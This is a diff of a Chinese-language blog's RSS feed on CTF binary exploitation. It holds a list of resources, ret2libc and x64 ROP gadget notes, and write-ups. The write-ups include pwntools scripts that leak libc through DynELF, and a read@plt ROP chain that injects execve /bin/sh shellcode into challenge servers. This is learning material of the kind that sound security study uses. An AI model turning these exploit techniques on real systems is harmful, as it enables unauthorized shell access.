@@ -17,57 +17,57 @@
       
       <guid>https://blog.zet.tw/posts/2018-01-09-how-to-pwnable/</guid>
       <description>陸續更新～
-website, doc and video https://ctf-wiki.github.io/ctf-wiki LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html Heap 手法整理 https://github.com/shellphish/how2heap 日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations 杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2 http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf https://github.com/str4tan/pwning Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug
+website, doc and video https://ctf-wiki.github.io/ctf-wiki  LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html  Heap 手法整理 https://github.com/shellphish/how2heap  日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations  杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf  Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE  https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn  inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2  http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf  https://github.com/str4tan/pwning  Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug
 https://github.com/snare/voltron </description>
       <content:encoded><![CDATA[<p>陸續更新～</p>
 <h2 id="website-doc-and-video">website, doc and video</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://ctf-wiki.github.io/ctf-wiki
-
-LiveOverflow youtube channel
-https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w
-http://liveoverflow.com/binary_hacking/protostar/index.html
-
-Heap 手法整理
-https://github.com/shellphish/how2heap
-
-日本選手的一系列投影片
-http://www.slideshare.net/bata_24/presentations
-
-杨坤：掘金CTF ——CTF中的内存漏洞利用技巧
-http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf
-
-Modern Binary Exploitation by RPISEC
-http://security.cs.rpi.edu/courses/binexp-spring2015/
-https://github.com/RPISEC/MBE
-
-https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn
-
-inaz2 整理的 exploit 手法
-http://inaz2.hatenablog.com/archive/category/Exploit?page=1
-http://inaz2.hatenablog.com/archive/category/Exploit?page=2
-
-http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf
-
-https://github.com/str4tan/pwning
-
-Heap:
-https://github.com/cloudburst/libheap
-https://github.com/DhavalKapil/libdheap
-https://github.com/degrigis/Heapy
-https://github.com/shellphish/how2heap
-</code></pre></div><h2 id="wargame-and-ctf">wargame and ctf</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://pwnable.tw/
-http://pwnable.kr/
-https://bamboofox.cs.nctu.edu.tw/
-http://overthewire.org/wargames/
-https://w3challs.com/
-https://exploit-exercises.com/nebula/
-http://ctf.katsudon.org/
-http://ctf.katsudon.org/ctf4u/
-</code></pre></div><h2 id="tools">tools</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://ctf-wiki.github.io/ctf-wiki
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>LiveOverflow youtube channel
+</span></span><span style="display:flex;"><span>https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w
+</span></span><span style="display:flex;"><span>http://liveoverflow.com/binary_hacking/protostar/index.html
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Heap 手法整理
+</span></span><span style="display:flex;"><span>https://github.com/shellphish/how2heap
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>日本選手的一系列投影片
+</span></span><span style="display:flex;"><span>http://www.slideshare.net/bata_24/presentations
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>杨坤：掘金CTF ——CTF中的内存漏洞利用技巧
+</span></span><span style="display:flex;"><span>http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Modern Binary Exploitation by RPISEC
+</span></span><span style="display:flex;"><span>http://security.cs.rpi.edu/courses/binexp-spring2015/
+</span></span><span style="display:flex;"><span>https://github.com/RPISEC/MBE
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>inaz2 整理的 exploit 手法
+</span></span><span style="display:flex;"><span>http://inaz2.hatenablog.com/archive/category/Exploit?page=1
+</span></span><span style="display:flex;"><span>http://inaz2.hatenablog.com/archive/category/Exploit?page=2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>https://github.com/str4tan/pwning
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Heap:
+</span></span><span style="display:flex;"><span>https://github.com/cloudburst/libheap
+</span></span><span style="display:flex;"><span>https://github.com/DhavalKapil/libdheap
+</span></span><span style="display:flex;"><span>https://github.com/degrigis/Heapy
+</span></span><span style="display:flex;"><span>https://github.com/shellphish/how2heap
+</span></span></code></pre></div><h2 id="wargame-and-ctf">wargame and ctf</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://pwnable.tw/
+</span></span><span style="display:flex;"><span>http://pwnable.kr/
+</span></span><span style="display:flex;"><span>https://bamboofox.cs.nctu.edu.tw/
+</span></span><span style="display:flex;"><span>http://overthewire.org/wargames/
+</span></span><span style="display:flex;"><span>https://w3challs.com/
+</span></span><span style="display:flex;"><span>https://exploit-exercises.com/nebula/
+</span></span><span style="display:flex;"><span>http://ctf.katsudon.org/
+</span></span><span style="display:flex;"><span>http://ctf.katsudon.org/ctf4u/
+</span></span></code></pre></div><h2 id="tools">tools</h2>
 <p><strong>debug</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://github.com/snare/voltron
-</code></pre></div>]]></content:encoded>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://github.com/snare/voltron
+</span></span></code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -103,60 +103,60 @@ read @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x000
 <h3 id="ret2libc-疊法">Ret2libc 疊法</h3>
 <p>可以盡可能的把參數疊完整，比較不會發生一些鳥問題</p>
 <p>一般x86的疊法是：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding +  function + ret address + argv1 + argv2 + argv3 ....
-</code></pre></div><p>一般 function 可以直接跳 <code>.plt</code> ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&quot;/bin/sh&quot;)，ret address 可以直接填空沒關係</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>padding +  function + ret address + argv1 + argv2 + argv3 ....
+</span></span></code></pre></div><p>一般 function 可以直接跳 <code>.plt</code> ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&quot;/bin/sh&quot;)，ret address 可以直接填空沒關係</p>
 <p>例如 :</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#39;A&#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr)
-</code></pre></div><p>x64:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&#39;A&#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr)
+</span></span></code></pre></div><p>x64:
 利用一些 <code>pop reg</code> 的getgads把reg設定好</p>
 <h3 id="x32">x32</h3>
 <p>參數直接疊在stack上，用 pop_ret 清掉用過的參數</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">read @ plt
-pop_pop_pop_ret
-0
-addr
-length
-system @ plt
-</code></pre></div><h3 id="x86_64">x86_64</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>read @ plt
+</span></span><span style="display:flex;"><span>pop_pop_pop_ret
+</span></span><span style="display:flex;"><span>0
+</span></span><span style="display:flex;"><span>addr
+</span></span><span style="display:flex;"><span>length
+</span></span><span style="display:flex;"><span>system @ plt
+</span></span></code></pre></div><h3 id="x86_64">x86_64</h3>
 <ul>
 <li>最大地址 <code>0x00007fffffffffff</code></li>
 </ul>
 <h3 id="dynelf">DynELF</h3>
 <p>假如在不知道對方libc 的情況下可以使用pwntools中的一個工具<code>DynELF</code>，給他一個leak的點，可以幫你找出function的位置</p>
 <p>這是313c CTF 中的 cfy 可以當作練習</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-
-printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x601020</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr):
-    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
-    r<span style="color:#f92672">.</span>sendline(p64(addr) )
-    s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;hex: 0x&#39;</span>)[<span style="color:#ae81ff">5</span>:]<span style="color:#f92672">.</span>strip()
-    s <span style="color:#f92672">=</span> p64( int(s,<span style="color:#ae81ff">16</span>) )
-    <span style="color:#66d9ef">return</span> s
-
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">4000</span>)
-
-ptr_libc <span style="color:#f92672">=</span> u64(leak(printf_got))
-d <span style="color:#f92672">=</span> DynELF(leak, ptr_libc)
-system <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>)
-
-print r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;quit&#39;</span>)
-r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;7&#39;</span>)
-r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(system) )
-
-r<span style="color:#f92672">.</span>interactive()
-</code></pre></div><h3 id="aslr">ASLR</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x601020</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr):
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(p64(addr) )
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;hex: 0x&#39;</span>)[<span style="color:#ae81ff">5</span>:]<span style="color:#f92672">.</span>strip()
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> p64( int(s,<span style="color:#ae81ff">16</span>) )
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">4000</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ptr_libc <span style="color:#f92672">=</span> u64(leak(printf_got))
+</span></span><span style="display:flex;"><span>d <span style="color:#f92672">=</span> DynELF(leak, ptr_libc)
+</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;quit&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;7&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(system) )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h3 id="aslr">ASLR</h3>
 <ul>
 <li>aslr on</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo sysctl -w kernel.randomize_va_space=2
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo sysctl -w kernel.randomize_va_space=2
+</span></span></code></pre></div><ul>
 <li>aslr off</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo sysctl -w kernel.randomize_va_space=0
-</code></pre></div><p>假如有ASLR，本的的話 32bit可以使用<code>ulimit -s unlimited</code>關閉，或是可以利用<code>puts</code>，leak <code>.got</code> 段上的資料 同一個 libc function 之間的偏移是固定的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo sysctl -w kernel.randomize_va_space=0
+</span></span></code></pre></div><p>假如有ASLR，本的的話 32bit可以使用<code>ulimit -s unlimited</code>關閉，或是可以利用<code>puts</code>，leak <code>.got</code> 段上的資料 同一個 libc function 之間的偏移是固定的</p>
 <p>一般常出現的函數 :</p>
 <ul>
 <li>__libc_start_main</li>
@@ -167,41 +167,41 @@ r<span style="color:#f92672">.</span>interactive()
 </ul>
 <h2 id="x64-通用gadgets">x64 通用gadgets</h2>
 <p>這些函數都可以利用</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">_init
-_start
-call_gmon_start
-deregister_tm_clones
-register_tm_clones
-__do_global_dtors_aux
-frame_dummy
-__libc_csu_init
-__libc_csu_fini
-_fini
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">ROPgadget --binary ./binary --depth 100
-</code></pre></div><p>不從版本 gadgets 會不太一樣，不過都可以通用，在於__libc_csu_init()</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>_init
+</span></span><span style="display:flex;"><span>_start
+</span></span><span style="display:flex;"><span>call_gmon_start
+</span></span><span style="display:flex;"><span>deregister_tm_clones
+</span></span><span style="display:flex;"><span>register_tm_clones
+</span></span><span style="display:flex;"><span>__do_global_dtors_aux
+</span></span><span style="display:flex;"><span>frame_dummy
+</span></span><span style="display:flex;"><span>__libc_csu_init
+</span></span><span style="display:flex;"><span>__libc_csu_fini
+</span></span><span style="display:flex;"><span>_fini
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>ROPgadget --binary ./binary --depth 100
+</span></span></code></pre></div><p>不從版本 gadgets 會不太一樣，不過都可以通用，在於__libc_csu_init()</p>
 <p>假如有些指令切一半的話也可以對reg做操作</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">&lt;__libc_csu_init&gt;:
-5b                       pop    rbx
-5d                       pop    rbp
-41 5c                    pop    r12   -&gt;   pop rsp (5c)
-41 5d                    pop    r13   -&gt;   pop rbp (5d)
-41 5e                    pop    r14   -&gt;   pop rsi (5e)
-41 5f                    pop    r15   -&gt;   pop rdi (5f)
-c3                       ret
-</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">mov    rbx,QWORD PTR [rsp+0x8]
-mov    rbp,QWORD PTR [rsp+0x10]
-mov    r12,QWORD PTR [rsp+0x18]
-mov    r13,QWORD PTR [rsp+0x20]
-mov    r14,QWORD PTR [rsp+0x28]
-mov    r15,QWORD PTR [rsp+0x30]
-add    rsp,0x38
-ret
-</code></pre></div><p>利用這些gadgets可以把 r12-r15 控好，<code>call qword ptr [r12+rbx*8]</code>的時候可以將<code>rbp等於1，rbx等於0</code>才會繼續ret下去，這部分可以自己跟一次比較清楚</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">4c 89 ea                 mov    rdx,r13
-4c 89 f6                 mov    rsi,r14
-44 89 ff                 mov    edi,r15d
-41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
-</code></pre></div><h2 id="one-gadgets-rce">One gadgets RCE</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>&lt;__libc_csu_init&gt;:
+</span></span><span style="display:flex;"><span>5b                       pop    rbx
+</span></span><span style="display:flex;"><span>5d                       pop    rbp
+</span></span><span style="display:flex;"><span>41 5c                    pop    r12   -&gt;   pop rsp (5c)
+</span></span><span style="display:flex;"><span>41 5d                    pop    r13   -&gt;   pop rbp (5d)
+</span></span><span style="display:flex;"><span>41 5e                    pop    r14   -&gt;   pop rsi (5e)
+</span></span><span style="display:flex;"><span>41 5f                    pop    r15   -&gt;   pop rdi (5f)
+</span></span><span style="display:flex;"><span>c3                       ret
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-diff" data-lang="diff"><span style="display:flex;"><span>mov    rbx,QWORD PTR [rsp+0x8]
+</span></span><span style="display:flex;"><span>mov    rbp,QWORD PTR [rsp+0x10]
+</span></span><span style="display:flex;"><span>mov    r12,QWORD PTR [rsp+0x18]
+</span></span><span style="display:flex;"><span>mov    r13,QWORD PTR [rsp+0x20]
+</span></span><span style="display:flex;"><span>mov    r14,QWORD PTR [rsp+0x28]
+</span></span><span style="display:flex;"><span>mov    r15,QWORD PTR [rsp+0x30]
+</span></span><span style="display:flex;"><span>add    rsp,0x38
+</span></span><span style="display:flex;"><span>ret
+</span></span></code></pre></div><p>利用這些gadgets可以把 r12-r15 控好，<code>call qword ptr [r12+rbx*8]</code>的時候可以將<code>rbp等於1，rbx等於0</code>才會繼續ret下去，這部分可以自己跟一次比較清楚</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>4c 89 ea                 mov    rdx,r13
+</span></span><span style="display:flex;"><span>4c 89 f6                 mov    rsi,r14
+</span></span><span style="display:flex;"><span>44 89 ff                 mov    edi,r15d
+</span></span><span style="display:flex;"><span>41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
+</span></span></code></pre></div><h2 id="one-gadgets-rce">One gadgets RCE</h2>
 <p>在一些特定的libc中藏有可以直接執行execv(&quot;/bin/sh&quot;)，可以觀察一下libc中有用到execv的附近藏有&quot;/bin/sh&quot;的字串，有機會可以直接成功</p>
 ]]></content:encoded>
     </item>
@@ -222,77 +222,77 @@ from pwn import * import time r = remote(&amp;#39;127.0.0.1&amp;#39;, 4000) read
       <content:encoded><![CDATA[<p>簡單紀錄一下</p>
 <h2 id="pwn1">PWN1</h2>
 <p>丟進ida 可以看到</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">if ( v4 == 0x90909090 )
-result = puts(aCensordCensord);
-else
-result = printf(&#34;Your point is only %d, try hard!\n&#34;, v4, v1,
-v2, v3);
-return result;
-</code></pre></div><p>直接塞90結束</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python -c &#39;print &#34;\x90&#34;*1000&#39; | nc 52.69.163.194 1111
-</code></pre></div><h2 id="pwn2">PWN2</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>if ( v4 == 0x90909090 )
+</span></span><span style="display:flex;"><span>result = puts(aCensordCensord);
+</span></span><span style="display:flex;"><span>else
+</span></span><span style="display:flex;"><span>result = printf(&#34;Your point is only %d, try hard!\n&#34;, v4, v1,
+</span></span><span style="display:flex;"><span>v2, v3);
+</span></span><span style="display:flex;"><span>return result;
+</span></span></code></pre></div><p>直接塞90結束</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>python -c &#39;print &#34;\x90&#34;*1000&#39; | nc 52.69.163.194 1111
+</span></span></code></pre></div><h2 id="pwn2">PWN2</h2>
 <p>定位到地20個字以後可以控制eip</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">gdb-peda$ info functions
-All defined functions:
-Non-debugging symbols:
-0x08048364  _init
-0x080483a0  read@plt
-</code></pre></div><p>可以指到<code>read</code>上,一般來說長這樣</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">call
-ret
-argv1
-￼argv2
-argv3
-</code></pre></div><p>可以控制<code>read</code>的返回地址跟參數,所以可以把<code>ret</code>跟我們shellcode 指到同一個位置上,shellcode的話隨便找一段空⽩白的地⽅方寫上去就好</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#f92672">import</span> time
-r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, <span style="color:#ae81ff">4000</span>)
-read_adr <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa0\x83\x04\x08</span><span style="color:#e6db74">&#34;</span>
-read <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\x01\x00\x00</span><span style="color:#e6db74">&#34;</span>
-p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">20</span> <span style="color:#f92672">+</span> read_adr <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00\xa1\x04\x08</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> read
-r<span style="color:#f92672">.</span>send (p)
-time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">5</span>)
-r<span style="color:#f92672">.</span>send (<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd</span>
-\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68<span style="color:#e6db74">&#34;)</span>
-</code></pre></div><h2 id="pwn3">PWN3</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gdb-peda$ info functions
+</span></span><span style="display:flex;"><span>All defined functions:
+</span></span><span style="display:flex;"><span>Non-debugging symbols:
+</span></span><span style="display:flex;"><span>0x08048364  _init
+</span></span><span style="display:flex;"><span>0x080483a0  read@plt
+</span></span></code></pre></div><p>可以指到<code>read</code>上,一般來說長這樣</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>call
+</span></span><span style="display:flex;"><span>ret
+</span></span><span style="display:flex;"><span>argv1
+</span></span><span style="display:flex;"><span>￼argv2
+</span></span><span style="display:flex;"><span>argv3
